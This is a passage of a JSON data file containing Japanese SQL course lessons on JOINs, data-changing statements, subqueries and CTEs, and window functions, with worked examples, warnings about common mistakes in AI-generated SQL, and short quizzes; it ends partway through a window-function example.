     "body": "## このレッスンのゴール\n\n- `JOIN ... ON ...` を読み、どのテーブルのどの列でつないでいるか説明できる\n- `INNER JOIN` と `LEFT JOIN` の結果の違いが分かる\n- JOIN の 3 つの落とし穴（COUNT(*)・行の増加・WHERE の位置）に気づける\n\nデータベース設計のコースのレッスン 2 で、1 対多・多対多と JOIN の基本を学びました。ここでは、**JOIN を使った集計で、AI がよく間違えるところ** を中心に見ます。\n\n## JOIN の読み方\n\n```sql\nSELECT o.id, c.name, o.ordered_at\nFROM orders o\nJOIN customers c ON c.id = o.customer_id\nORDER BY o.id;\n```\n\n```text\nid | name | ordered_at\n1  | Ryo  | 2026-10-01\n2  | Ryo  | 2026-10-15\n3  | Hana | 2026-10-20\n4  | Ken  | 2026-11-02\n5  | Hana | 2026-11-05\n6  | Mio  | 2026-11-10\n```\n\n| 部分 | 意味 |\n|---|---|\n| `FROM orders o` | orders テーブルに `o` という **短い別名** を付ける |\n| `JOIN customers c` | customers を `c` としてつなぐ |\n| `ON c.id = o.customer_id` | **つなぐ条件**：注文の customer_id と、お客さんの id が同じもの同士 |\n| `o.id`、`c.name` | どちらのテーブルの列か。両方に `id` があるので、付けないとエラー |\n\n```sql\nSELECT name, id FROM customers JOIN orders ON customers.id = orders.customer_id;\n-- エラー：ambiguous column name: id   （どちらの id か分からない）\n```\n\n## INNER JOIN と LEFT JOIN\n\n```sql\nSELECT c.name, COUNT(o.id) AS orders\nFROM customers c\nLEFT JOIN orders o ON o.customer_id = c.id\nGROUP BY c.id\nORDER BY c.id;\n```\n\n```text\nRyo  | 2\nHana | 2\nKen  | 1\nMio  | 1\nSora | 0      ← 注文の無い Sora さんも出る\n```\n\n| | `JOIN`（`INNER JOIN`） | `LEFT JOIN` |\n|---|---|---|\n| 結果に出るもの | **両方に相手がいる** 組み合わせだけ | 左（FROM の側）は **全部**。相手がいなければ右の列は NULL |\n| Sora さん（注文 0 件） | 出ない | 出る（orders の列は NULL） |\n\n「**注文していないお客さんも含めて** 一覧にしたい」なら LEFT JOIN、「注文があるものだけ」なら JOIN です。\n\n### 相手がいないものを探す\n\n```sql\nSELECT c.name\nFROM customers c\nLEFT JOIN orders o ON o.customer_id = c.id\nWHERE o.id IS NULL;\n-- Sora\n```\n\nLEFT JOIN して、相手の列が NULL のものだけを残すと、「一度も注文していないお客さん」が分かります（レッスン 6 の `NOT EXISTS` でも書けます）。\n\n## 3 つ以上つなぐ\n\n```sql\nSELECT o.id, p.name, oi.qty, p.price * oi.qty AS subtotal\nFROM orders o\nJOIN order_items oi ON oi.order_id = o.id\nJOIN products p     ON p.id = oi.product_id\nWHERE o.id IN (1, 4)\nORDER BY o.id;\n```\n\n```text\nid | name         | qty | subtotal\n1  | りんご       | 3   | 360\n1  | 牛乳         | 1   | 200\n4  | りんご       | 5   | 600\n4  | バナナ       | 6   | 540\n4  | クロワッサン | 2   | 360\n```\n\n**上から順に、1 つずつつないでいく** と読みます。orders → その注文の中身（order_items）→ その中身の商品（products）。注文 1 は 2 行、注文 4 は 3 行になりました。**注文の中身の数だけ、行が増えた** ことに注目してください。\n\nこれを合計すれば、注文ごとの金額が出ます。\n\n```sql\nSELECT o.id, SUM(p.price * oi.qty) AS total\nFROM orders o\nJOIN order_items oi ON oi.order_id = o.id\nJOIN products p     ON p.id = oi.product_id\nWHERE o.status <> 'cancelled'\nGROUP BY o.id\nORDER BY total DESC;\n```\n\n```text\n6 | 2400\n4 | 1500\n2 | 1200\n5 | 650\n1 | 560\n```\n\n## 落とし穴 ① LEFT JOIN と COUNT(*)\n\n上の「お客さんごとの注文数」で、`COUNT(o.id)` を `COUNT(*)` にすると…\n\n```text\nRyo  | 2\nHana | 2\nKen  | 1\nMio  | 1\nSora | 1      ← 0 のはずが 1 に！\n```\n\nLEFT JOIN では、Sora さんの行が **orders の列が NULL の 1 行** として残ります。`COUNT(*)` は行を数えるのでその 1 行も数え、`COUNT(o.id)` は NULL を数えない（レッスン 3）ので 0 になります。\n**LEFT JOIN で相手の数を数えるときは、`COUNT(相手の列)`** にします。\n\n## 落とし穴 ② つなぐと行が増えて、数がずれる\n\n「お客さんごとの注文数と、買った商品の個数」を 1 回で出そうとしました。\n\n```sql\nSELECT c.name, COUNT(o.id) AS orders, SUM(oi.qty) AS items\nFROM customers c\nJOIN orders o       ON o.customer_id = c.id\nJOIN order_items oi ON oi.order_id = o.id\nGROUP BY c.id;\n```\n\n```text\nRyo  | 3 | 5\nHana | 3 | 5\nKen  | 3 | 13     ← Ken さんの注文は 1 回だけなのに 3\nMio  | 1 | 2\n```\n\norder_items までつないだので、**注文 1 件が中身の数だけ増えて** います（Ken さんの注文 4 は中身が 3 つ → 3 行）。その行を `COUNT(o.id)` で数えたので、注文数が増えてしまいました。\n\n| 直し方 | |\n|---|---|\n| `COUNT(DISTINCT o.id)` | 同じ注文は 1 回だけ数える（結果は Ryo 2・Hana 2・Ken 1・Mio 1 に直った） |\n| 別々に集計してからつなぐ | 注文数と商品数を、それぞれサブクエリや WITH（レッスン 6）で出してからつなぐ。**SUM がずれるときはこちらが必要** |\n\n⚠️ `SUM` は `DISTINCT` では直せません（同じ金額の違う商品まで 1 つにしてしまう）。1 対多のテーブルを 2 つ以上つないで SUM するときは、特に注意が必要です。\n\n**JOIN した後は、1 行が「何を表しているか」を考える** のが大事です。orders だけなら「1 行 ＝ 1 注文」、order_items までつなぐと「1 行 ＝ 注文の中身 1 つ」に変わります。\n\n## 落とし穴 ③ WHERE に書くと LEFT JOIN が消える\n\n「全員を出して、paid の注文があれば一緒に出す」つもりの SQL です。\n\n```sql\nSELECT c.name, o.id\nFROM customers c\nLEFT JOIN orders o ON o.customer_id = c.id\nWHERE o.status = 'paid';\n```\n\n```text\nRyo  | 1\nRyo  | 2\nHana | 5\nKen  | 4         ← Mio さんと Sora さんが消えた\n```\n\nLEFT JOIN で残った Sora さんの行は、`o.status` が NULL です。それを **WHERE**（つないだ後に 1 行ずつ絞る）で `= 'paid'` と比べたので、消えてしまいました。結果的に、普通の JOIN と同じです。\n\n**相手の側の条件は、`ON` に書きます**。\n\n```sql\nSELECT c.name, o.id\nFROM customers c\nLEFT JOIN orders o ON o.customer_id = c.id AND o.status = 'paid';\n```\n\n```text\nRyo  | 1\nRyo  | 2\nHana | 5\nKen  | 4\nMio  | NULL      ← paid の注文は無いが、本人は残る\nSora | NULL\n```\n\n| 条件を書く場所 | 意味 |\n|---|---|\n| `ON ... AND o.status = 'paid'` | **つなぐ相手を選ぶ**条件。左は全員残る |\n| `WHERE o.status = 'paid'` | つないだ **後の行を絞る** 条件。相手がいない行は消える |\n\n## 他の書き方\n\n```sql\nSELECT COUNT(*) FROM customers, products;   -- 30\n```\n\n`FROM a, b` と並べて ON を書かないと、**すべての組み合わせ**（5 人 × 6 商品 ＝ 30 行）になります（クロス結合）。古い書き方で `WHERE a.id = b.a_id` とつなぐこともありますが、条件を書き忘れると大量の行になるので、`JOIN ... ON` を使うのが安全です。\n\npandas（Python の表計算のライブラリ）では、`pd.merge(orders, customers, left_on=\"customer_id\", right_on=\"id\", how=\"left\")` が LEFT JOIN です。`how` が `\"inner\"`・`\"left\"` に対応します。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `LEFT JOIN` ＋ `COUNT(*)` | ⚠️ 相手がいなくても 1 になる。`COUNT(相手の列)` に |\n| 1 対多を 2 つ以上 JOIN して `SUM` / `COUNT` | ⚠️ 行が増えて数がずれていないか。1 行が何を表すか確認 |\n| `SELECT DISTINCT` で JOIN の重複を消している | ⚠️ 原因を隠していないか |\n| `LEFT JOIN` の相手の列を `WHERE` で条件にしている | ⚠️ 実質 INNER JOIN になっている。意図どおりか |\n| ORM の `joinedload` / `include` | 裏で JOIN が走っている（データベース設計のコースのレッスン 6） |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "注文が 0 件のお客さんも含めて「お客さんごとの注文数」を出したい。正しいのは？",
        "choices": [
         "`JOIN` と `COUNT(*)`",
         "`LEFT JOIN` と `COUNT(*)`",
         "`LEFT JOIN` と `COUNT(o.id)`"
        ],
        "answer": 2,
        "explain": "LEFT JOIN で 0 件の人も残しますが、COUNT(*) だと NULL の 1 行を数えて 1 になります。相手の列を数えると 0 になります。"
       },
       {
        "question": "orders と order_items をつないで `COUNT(o.id)` したら、注文数が実際より多くなった。理由は？",
        "choices": [
         "注文 1 件が、中身（order_items）の数だけ行に増えたから",
         "COUNT は NULL を数えるから",
         "JOIN の書き方が間違っていて、エラーを無視しているから"
        ],
        "answer": 0,
        "explain": "1 対多をつなぐと「1 行 ＝ 注文の中身 1 つ」になります。注文を数えるなら `COUNT(DISTINCT o.id)` か、つなぐ前に集計します。"
       },
       {
        "question": "`LEFT JOIN orders o ON ... WHERE o.status = 'paid'` で、注文の無いお客さんが消えた。直し方は？",
        "choices": [
         "LEFT JOIN を RIGHT JOIN にする",
         "`o.status = 'paid'` を WHERE ではなく ON の条件に移す",
         "DISTINCT を付ける"
        ],
        "answer": 1,
        "explain": "WHERE はつないだ後に行を絞るので、相手が NULL の行が消えます。ON に書けば「つなぐ相手を選ぶ」条件になり、左は全員残ります。"
       }
      ]
     ],
     "id": "04-join"
    },
    {
     "title": "INSERT・UPDATE・DELETE ― データを変える SQL",
     "level": 2,
     "minutes": 16,
     "concepts": [
      "database",
      "security",
      "errors"
     ],
     "summary": "行を足す・変える・消す SQL の読み方。WHERE を忘れた UPDATE が全行を書き換える事故、変わった行数（rowcount）の確かめ方、RETURNING、あれば更新・無ければ追加の UPSERT。",
     "body": "## このレッスンのゴール\n\n- `INSERT`・`UPDATE`・`DELETE` を読み、どの行がどう変わるか説明できる\n- `WHERE` の無い UPDATE・DELETE の危険と、事故を防ぐ習慣が分かる\n- `RETURNING` と `ON CONFLICT`（UPSERT）を読める\n\nここでは、データを変える SQL を見ます。**SELECT と違って、間違えると元に戻せない** ことがあるので、読むときの注意も合わせて学びます。\n\n## INSERT：行を足す\n\n```sql\nINSERT INTO products (name, category, price) VALUES ('ヨーグルト', '飲み物', 150);\n```\n\n| 部分 | 意味 |\n|---|---|\n| `INSERT INTO products` | products に足す |\n| `(name, category, price)` | 値を入れる列（書かない列は DEFAULT か NULL。id は自動の連番） |\n| `VALUES (...)` | 入れる値（列と同じ順番） |\n\n```sql\nINSERT INTO products (name, category, price)\nVALUES ('みかん', '果物', 80), ('ぶどう', '果物', 400)\nRETURNING id, name;\n```\n\n```text\nid | name\n8  | みかん\n9  | ぶどう\n```\n\n`VALUES` を `,` で並べると、まとめて何行も足せます。`RETURNING` は「**足した行の、この列を返して**」という指定で、自動で振られた id をすぐに知りたいときに便利です（SQLite 3.35 以降・PostgreSQL。MySQL には無い）。\n\n⚠️ 列の指定を省略して `INSERT INTO products VALUES (...)` と書くと、**テーブルのすべての列を順番どおり** に書く必要があり、列が増えたときに壊れます。列名は書くのが安全です。\n\n## UPDATE：行を変える\n\n```sql\nUPDATE products SET price = price + 10 WHERE category = '果物';\n-- 4 行が変わった\n```\n\n```text\nりんご 130 / バナナ 100 / みかん 90 / ぶどう 410\n```\n\n| 部分 | 意味 |\n|---|---|\n| `UPDATE products` | products の |\n| `SET price = price + 10` | price を「今の price ＋ 10」に（複数なら `SET a = 1, b = 2`） |\n| `WHERE category = '果物'` | **この条件に合う行だけ** |\n\n`price = price + 10` は、Python の `price += 10` と同じで、今の値を使って計算しています。データベース設計のコースのレッスン 5 で、在庫を安全に減らすときに使った形です。\n\n### ⚠️ WHERE を忘れると全部変わる\n\n```sql\nUPDATE products SET category = 'その他';\n-- 8 行が変わった（全部）\n```\n\n```text\nSELECT DISTINCT category FROM products;\n-- その他\n```\n\n**WHERE を書かない UPDATE は、テーブルのすべての行を書き換えます**。エラーにも警告にもならず、一瞬で終わります。DELETE も同じで、`DELETE FROM products;` は全行を消します。\n\n| 事故を防ぐ習慣 | |\n|---|---|\n| **先に同じ WHERE で SELECT する** | `SELECT * FROM products WHERE category = '果物'` で、変わる行を確かめてから UPDATE に書き換える |\n| トランザクションの中で試す | `BEGIN;` → UPDATE → 確認 → 良ければ `COMMIT;`、だめなら `ROLLBACK;`（データベース設計のコースのレッスン 5） |\n| 変わった行数を確かめる | 下の rowcount |\n| 本番で手作業の SQL を打たない | 打つなら、バックアップを確かめてから（公開とクラウドのコースのレッスン 8） |\n\nMySQL の公式のコマンドツールには、WHERE の無い UPDATE・DELETE を止める `--safe-updates` という設定もあります。\n\n## 変わった行数：rowcount\n\n```python\ncur = conn.execute(\"UPDATE products SET price = 999 WHERE name = ?\", (\"ないもの\",))\nprint(cur.rowcount)    # 0\n```\n\n条件に合う行が無いと、**エラーにはならず、0 行が変わる** だけです。「更新したつもりで、実は何も変わっていなかった」に気づけるよう、`rowcount` を確かめるコードもよく書かれます。\n\n```python\nif cur.rowcount == 0:\n    raise HTTPException(404, \"商品が見つかりません\")\n```\n\n## DELETE：行を消す\n\n```sql\nDELETE FROM products WHERE id = 9 RETURNING name;\n-- ぶどう\n```\n\n外部キーでつながっている行（注文に使われている商品など）は、`ON DELETE` の設定（データベース設計のコースのレッスン 2）によって、一緒に消えたり、消せなかったりします。\n\n### 本当に消す？「論理削除」\n\n```sql\nALTER TABLE products ADD COLUMN deleted_at TEXT;                   -- 消した日時の列を足しておき\nUPDATE products SET deleted_at = '2026-11-23' WHERE id = 9;          -- 「消した」印を付けるだけ\nSELECT * FROM products WHERE deleted_at IS NULL;                     -- 普段は印の無いものだけ見る\n```\n\n行を本当に消さずに **「消した」印を付ける** やり方を **論理削除** と呼びます。間違えて消しても戻せる、過去の注文から商品名を表示できる、などの利点があります。代わりに、**すべての SELECT に `WHERE deleted_at IS NULL` を付け忘れない** 必要があります。\n\n## UPSERT：あれば更新、無ければ追加\n\n```sql\nINSERT INTO products (id, name, category, price) VALUES (1, 'りんご', '果物', 150);\n-- エラー：UNIQUE constraint failed: products.id   （id 1 はもうある）\n\nINSERT INTO products (id, name, category, price) VALUES (1, 'りんご', '果物', 150)\nON CONFLICT (id) DO UPDATE SET price = excluded.price;\n-- 1 行が変わった → りんごの price が 150 に\n```\n\n| 部分 | 意味 |\n|---|---|\n| `ON CONFLICT (id)` | id が重複したら |\n| `DO UPDATE SET price = excluded.price` | 追加しようとした値（`excluded`）で、既存の行を更新する |\n| `DO NOTHING` | 重複したら何もしない |\n\nINSERT（追加）と UPDATE（更新）を合わせて **UPSERT** と呼びます。「先に SELECT して、あれば UPDATE、無ければ INSERT」と書くと、同時に 2 人が実行したときにずれます（データベース設計のコースの「競合」）。1 つの SQL にしておくと安全です。\n\n| データベース | UPSERT の書き方 |\n|---|---|\n| SQLite・PostgreSQL | `ON CONFLICT (...) DO UPDATE SET ... = excluded....` |\n| MySQL | `ON DUPLICATE KEY UPDATE n = VALUES(n)` |\n\n## Python から実行するとき\n\n```python\nwith conn:     # トランザクション：最後に commit、例外なら rollback\n    conn.execute(\"UPDATE products SET price = ? WHERE id = ?\", (new_price, product_id))\n```\n\n- 値は必ず `?` で渡す（セキュリティのコースのレッスン 3）\n- `commit` しないと保存されない（`with conn:` が自動で commit してくれる）\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `UPDATE ... SET ...` / `DELETE FROM ...` に WHERE が無い | ⚠️ 全行が対象。本当に全部？ |\n| `WHERE id = ?` の UPDATE の後に rowcount を見ていない | 見つからなくても成功扱いになる |\n| SELECT → if → INSERT / UPDATE の 3 段階 | 同時に実行するとずれる。UPSERT か制約＋エラー処理に |\n| `deleted_at IS NULL` が一部の SELECT にしか無い | ⚠️ 消したはずのものが表示される |\n| `INSERT INTO t VALUES (...)`（列名なし） | 列の追加で壊れる。列名を書く |\n| `TRUNCATE` / `DROP TABLE` | 全行削除／テーブルごと削除。マイグレーション以外で見たら要確認 |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`UPDATE products SET price = 0;` を実行すると？",
        "choices": [
         "何も変わらない（WHERE が無いので）",
         "エラーになる",
         "すべての商品の値段が 0 になる"
        ],
        "answer": 2,
        "explain": "WHERE の無い UPDATE は全行を書き換えます。エラーも警告も出ないので、実行前に同じ条件の SELECT で確かめる習慣をつけましょう。"
       },
       {
        "question": "`UPDATE products SET price = 999 WHERE name = 'ないもの'` を実行した。結果は？",
        "choices": [
         "「見つかりません」というエラー",
         "エラーにならず、変わった行が 0 になる",
         "新しい行が追加される"
        ],
        "answer": 1,
        "explain": "条件に合う行が無ければ、0 行が変わるだけです。見つからないことを知りたいなら rowcount を確かめます。"
       },
       {
        "question": "`ON CONFLICT (id) DO UPDATE SET price = excluded.price` の `excluded` は何を指す？",
        "choices": [
         "削除された行",
         "すでにテーブルにある行",
         "今 INSERT しようとして、重複で入らなかった値"
        ],
        "answer": 2,
        "explain": "重複したときに、追加しようとした値（excluded）を使って既存の行を更新します。"
       }
      ]
     ],
     "id": "05-insert-update-delete"
    },
    {
     "title": "サブクエリと WITH ― SQL を組み立てて読む",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "database",
      "functions",
      "reading"
     ],
     "summary": "SQL の中に SQL を入れるサブクエリ（WHERE の中・IN・EXISTS）と、名前を付けて段階的に書く WITH（CTE）。長い SQL を「部品」に分けて読む方法と、NOT IN に NULL が混ざると 0 件になる罠。",
     "body": "## このレッスンのゴール\n\n- `WHERE` の中のサブクエリ・`IN`・`EXISTS` を読める\n- `WITH` で書かれた長い SQL を、部品ごとに分けて読める\n- `NOT IN` に NULL が混ざると結果が 0 件になる理由が分かり、`NOT EXISTS` を使える\n\n## サブクエリ：SQL の中の SQL\n\n「平均より高い商品」を出します。\n\n```sql\nSELECT name, price FROM products\nWHERE price > (SELECT AVG(price) FROM products);\n-- コーヒー豆 | 1200\n```\n\nかっこの中の `SELECT AVG(price) FROM products` が **先に計算されて**（340）、外の SQL は `WHERE price > 340` として動きます。Python で言うと、こうです。\n\n```python\navg = sum(p[\"price\"] for p in products) / len(products)\n[p for p in products if p[\"price\"] > avg]\n```\n\n### IN と組み合わせる\n\n```sql\nSELECT name FROM customers\nWHERE id IN (SELECT customer_id FROM orders WHERE status = 'paid');\n-- Ryo / Hana / Ken\n```\n\nかっこの中は「paid の注文をしたお客さんの id の一覧」です。外の SQL はその一覧に入っている人を選びます。\n\n## EXISTS：「あるかどうか」だけを見る\n\n```sql\nSELECT name FROM customers c\nWHERE NOT EXISTS (\n  SELECT 1 FROM orders o WHERE o.customer_id = c.id\n);\n-- Sora\n```\n\n| 部分 | 意味 |\n|---|---|\n| `EXISTS (...)` | かっこの中の SQL が **1 行でも返せば真** |\n| `NOT EXISTS (...)` | 1 行も返さなければ真 |\n| `SELECT 1` | 返す中身は何でもよい（あるかどうかしか見ないので、`1` と書く習慣） |\n| `o.customer_id = c.id` | **外の行（c）を使っている**。お客さん 1 人ずつについて、「その人の注文はある？」を調べる |\n\n外の行を使うサブクエリを **相関サブクエリ** と呼びます。Python の `any()` に近い考え方です。\n\n```python\n[c for c in customers if not any(o[\"customer_id\"] == c[\"id\"] for o in orders)]\n```\n\n## ⚠️ NOT IN と NULL\n\n同じことを `NOT IN` でも書けます。\n\n```sql\nSELECT name FROM customers WHERE id NOT IN (SELECT customer_id FROM orders);\n-- Sora\n```\n\nここまでは同じです。でも、かっこの中の一覧に **NULL が 1 つでも混ざる** と…\n\n```sql\nSELECT name FROM customers\nWHERE id NOT IN (SELECT customer_id FROM orders UNION ALL SELECT NULL);\n-- （0 件）\n```\n\n**誰も出てこなくなりました**。`5 NOT IN (1, 2, 3, 4, NULL)` は、「5 は NULL ではない？」が「わからない」（レッスン 1）になるので、全体も「わからない」になり、条件に合いません。\n\n| 書き方 | 一覧に NULL が混ざると |\n|---|---|\n| `NOT IN (サブクエリ)` | ⚠️ **0 件** になる |\n| `NOT EXISTS (サブクエリ)` | ✅ 正しく Sora さんが出る（実際に確かめました） |\n\n外部キーの列が NULL を許す（注文に「ゲストのお客さん」がいる、など）と、ある日突然 0 件になります。**「〜が無いもの」を探すときは `NOT EXISTS`** にするのが安全です。\n\n## WITH（CTE）：部品に名前を付ける\n\n長い SQL は、**途中の結果に名前を付けて、段階的に書く** と読みやすくなります。`WITH 名前 AS (...)` を **CTE**（共通テーブル式）と呼びます。\n\n「paid の注文について、お客さんごとの注文数・合計・1 回の平均」を出します。\n\n```sql\nWITH order_totals AS (               -- ① 注文ごとの合計を作る\n  SELECT o.id, o.customer_id, SUM(p.price * oi.qty) AS total\n  FROM orders o\n  JOIN order_items oi ON oi.order_id = o.id\n  JOIN products p     ON p.id = oi.product_id\n  WHERE o.status = 'paid'\n  GROUP BY o.id\n)\nSELECT c.name,                       -- ② それをお客さんごとにまとめる\n       COUNT(*)     AS orders,\n       SUM(t.total) AS total,\n       AVG(t.total) AS avg_order\nFROM order_totals t\nJOIN customers c ON c.id = t.customer_id\nGROUP BY c.id\nORDER BY total DESC;\n```\n\n```text\nname | orders | total | avg_order\nRyo  | 2      | 1760  | 880.0\nKen  | 1      | 1500  | 1500.0\nHana | 1      | 650   | 650.0\n```\n\n| 段階 | 1 行が表すもの |\n|---|---|\n| ① `order_totals` | **注文 1 件**（id・お客さん・合計） |\n| ② 最後の SELECT | **お客さん 1 人** |\n\nレッスン 4 の「落とし穴 ②」（つなぐと行が増えて数がずれる）を、**先に注文ごとに集計してからつなぐ** ことで避けています。`COUNT(*)` が正しく注文数になっているのはこのためです。\n\nPython で言うと、途中の結果を変数に入れてから次の処理をするのと同じです。\n\n```python\norder_totals = [...]   # ①\nresult = [...]         # ② order_totals を使う\n```\n\n### WITH を読むコツ\n\n1. `WITH` の部品を **上から 1 つずつ** 読み、それぞれ「1 行が何を表すか」を書き出す\n2. 最後の SELECT で、部品がどうつながっているかを見る\n3. 分からなければ、部品の SQL だけを取り出して実行してみる\n\n`WITH a AS (...), b AS (...)` と `,` で部品をいくつも並べられ、後の部品は前の部品を使えます。\n\n## サブクエリ・JOIN・WITH の使い分け\n\n| やりたいこと | 書き方の例 |\n|---|---|\n| 1 つの値と比べる（平均より高い） | `WHERE x > (SELECT AVG(...) ...)` |\n| 「〜があるもの／無いもの」 | `EXISTS` / `NOT EXISTS` |\n| 相手の列も表示したい | `JOIN` |\n| 集計してからつなぐ・段階が多い | `WITH` |\n\n同じ結果になる書き方がいくつもあるのが SQL です。AI の SQL が自分の思いつく形と違っても、**結果が同じか** を考えればよいのです。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `WHERE id NOT IN (SELECT ...)` | ⚠️ サブクエリの列が NULL になりうるなら `NOT EXISTS` に |\n| `WITH ... AS (...)` が 3 つ 4 つ | 部品ごとに「1 行が何か」を確かめながら読む |\n| SELECT の列の中のサブクエリ（`(SELECT COUNT(*) FROM ... WHERE ... = c.id) AS n`） | 行ごとに実行される。件数が多いと遅いことがある（N+1 と似た形） |\n| `WITH RECURSIVE` | 自分自身を使う CTE。カテゴリの親子・組織図などの木をたどる |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`WHERE price > (SELECT AVG(price) FROM products)` の動きとして正しいのは？",
        "choices": [
         "かっこの中で平均を先に計算し、その値より高い商品を選ぶ",
         "商品ごとに、その商品の値段の平均を計算する",
         "エラーになる（WHERE に SELECT は書けない）"
        ],
        "answer": 0,
        "explain": "かっこの中のサブクエリが 1 つの値（平均）を返し、外の WHERE がそれと比べます。"
       },
       {
        "question": "「注文したことの無いお客さん」を探すのに、`NOT IN` より `NOT EXISTS` が安全な理由は？",
        "choices": [
         "NOT EXISTS のほうが短く書けるから",
         "サブクエリの結果に NULL が 1 つでも混ざると、NOT IN は 0 件になってしまうから",
         "NOT IN は古くて使えないから"
        ],
        "answer": 1,
        "explain": "`NOT IN (..., NULL)` は「わからない」になり、どの行も条件に合いません。NOT EXISTS は NULL の影響を受けません。"
       },
       {
        "question": "長い `WITH` の SQL を読むときのコツとして適切なのは？",
        "choices": [
         "最後の SELECT から読み、WITH の中は読まない",
         "部品を上から 1 つずつ読み、それぞれ「1 行が何を表すか」を確かめる",
         "全体を一度に頭の中で実行する"
        ],
        "answer": 1,
        "explain": "WITH は途中の結果に名前を付けたものです。部品ごとに分けて読めば、長い SQL も短い SQL の組み合わせとして読めます。"
       }
      ]
     ],
     "id": "06-subquery-cte"
    },
    {
     "title": "ウィンドウ関数 ― 行を残したまま集計する",
     "level": 3,
     "minutes": 20,
     "concepts": [
      "database",
      "higher_order",
      "reading"
     ],
     "summary": "GROUP BY と違って「行をまとめずに」順位・グループの平均・累計・前の行との比較を付ける OVER 句。ROW_NUMBER・RANK・DENSE_RANK の違い、カテゴリごとの 1 位を取り出す定番の形、WHERE で使えない理由。",
     "body": "## このレッスンのゴール\n\n- `関数() OVER (PARTITION BY ... ORDER BY ...)` を読み、何を計算しているか説明できる\n- `ROW_NUMBER`・`RANK`・`DENSE_RANK` の違いが分かる\n- 「グループごとの上位 N 件」「累計」「前の行との差」の SQL を読める\n\n## GROUP BY との違い\n\nレッスン 3 の GROUP BY は、**グループを 1 行にまとめて** しまいました。ウィンドウ関数は、**行はそのまま残して、横に集計の結果を付け足します**。\n\n```sql\nSELECT name, price,\n       AVG(price) OVER (PARTITION BY category) AS cat_avg,\n       price - AVG(price) OVER (PARTITION BY category) AS diff\nFROM products;\n```\n\n```text\nname         | price | cat_avg | diff\n食パン       | 250   | 215.0   | 35.0\nクロワッサン | 180   | 215.0   | -35.0\nりんご       | 120   | 105.0   | 15.0\nバナナ       | 90    | 105.0   | -15.0\n牛乳         | 200   | 700.0   | -500.0\nコーヒー豆   | 1200  | 700.0   | 500.0\n```\n\n6 行のまま、それぞれの行に「同じカテゴリの平均」と「平均との差」が付きました。\n\n| 部分 | 意味 |\n|---|---|\n| `AVG(price)` | 何を計算するか（集計関数がそのまま使える） |\n| `OVER (...)` | 「ウィンドウ関数として使う」という印。かっこの中が **どの範囲（窓）で計算するか** |\n| `PARTITION BY category` | category ごとに区切って計算する（GROUP BY の「まとめない版」） |\n\n## 順位を付ける\n\n```sql\nSELECT name, category, price,\n       RANK() OVER (PARTITION BY category ORDER BY price DESC) AS rank_in_cat\nFROM products;\n```\n\n```text\n食パン       | パン   | 250  | 1\nクロワッサン | パン   | 180  | 2\nりんご       | 果物   | 120  | 1\nバナナ       | 果物   | 90   | 2\nコーヒー豆   | 飲み物 | 1200 | 1\n牛乳         | 飲み物 | 200  | 2\n```\n\n`ORDER BY price DESC` は、**窓の中で** 値段の高い順に並べる、という意味です（SQL 全体の並べ替えではありません）。\n\n### ROW_NUMBER・RANK・DENSE_RANK\n\n同じ値段の商品があると違いが出ます。120 円の「りんご（訳あり）」を足して比べました。\n\n```sql\nSELECT name, price,\n       RANK()       OVER (ORDER BY price) AS r,\n       DENSE_RANK() OVER (ORDER BY price) AS dr,\n       ROW_NUMBER() OVER (ORDER BY price) AS rn\nFROM ...;\n```\n\n```text\nname             | price | r | dr | rn\nバナナ           | 90    | 1 | 1  | 1\nりんご           | 120   | 2 | 2  | 2\nりんご（訳あり） | 120   | 2 | 2  | 3\nクロワッサン     | 180   | 4 | 3  | 4\n牛乳             | 200   | 5 | 4  | 5\n食パン           | 250   | 6 | 5  | 6\nコーヒー豆       | 1200  | 7 | 6  | 7\n```\n\n| 関数 | 同じ値のとき | 次の順位 | 例 |\n|---|---|---|---|\n| `RANK()` | 同じ順位 | **飛ぶ**（2, 2, 4） | スポーツの順位 |\n| `DENSE_RANK()` | 同じ順位 | **飛ばない**（2, 2, 3） | 「何番目に高い値段か」 |\n| `ROW_NUMBER()` | **必ず違う番号** | 1 ずつ | 1 件だけ選びたいとき |\n\n⚠️ `ROW_NUMBER()` で同じ値のどちらが 2 番になるかは、**決まっていません**。決めたいなら `ORDER BY price, id` のように列を足します（レッスン 2 と同じ）。\n\n## 定番：グループごとの 1 位（上位 N 件）\n\n「カテゴリごとに、いちばん高い商品」。レッスン 3 で GROUP BY では書けなかったものです。\n\n```sql\nWITH ranked AS (\n  SELECT name, category, price,\n         ROW_NUMBER() OVER (PARTITION BY category ORDER BY price DESC) AS rn\n  FROM products\n)\nSELECT category, name, price FROM ranked WHERE rn = 1;\n```\n\n```text\nパン   | 食パン     | 250\n果物   | りんご     | 120\n飲み物 | コーヒー豆 | 1200\n```\n\n① 窓関数で、カテゴリの中の順番を付ける → ② WITH（レッスン 6）の外で `rn = 1` を選ぶ。`rn <= 3` にすれば「カテゴリごとの上位 3 件」です。**AI の SQL で最もよく見るウィンドウ関数の使い方** です。\n\n### ⚠️ WHERE では直接使えない\n\n```sql\nSELECT name, ROW_NUMBER() OVER (ORDER BY price DESC) AS rn\nFROM products\nWHERE rn <= 2;\n-- エラー：misuse of aliased window function rn\n```\n\nレッスン 3 の「実行される順番」を思い出してください。ウィンドウ関数は **SELECT（⑤）の段階** で計算されるので、それより前の WHERE（②）では使えません。だから、上のように **WITH やサブクエリで包んでから、外で絞ります**。\n\n## 累計と、前の行との比較\n\n日ごとの売上に、累計と前の日の売上を付けます。\n\n```sql\nWITH daily AS (\n  SELECT o.ordered_at AS d, SUM(p.price * oi.qty) AS sales\n  FROM orders o\n  JOIN order_items oi ON oi.order_id = o.id\n  JOIN products p     ON p.id = oi.product_id\n  WHERE o.status <> 'cancelled'\n  GROUP BY o.ordered_at\n)\nSELECT d, sales,\n       SUM(sales) OVER (ORDER BY d) AS running_total,\n       LAG(sales) OVER (ORDER BY d) AS prev\nFROM daily;\n```\n\n```text\nd          | sales | running_total | prev\n2026-10-01 | 560   | 560           | NULL\n2026-10-15 | 1200  | 1760          | 560\n2026-11-02 | 1500  | 3260          | 1200\n2026-11-05 | 650   | 3910          | 1500\n2026-11-10 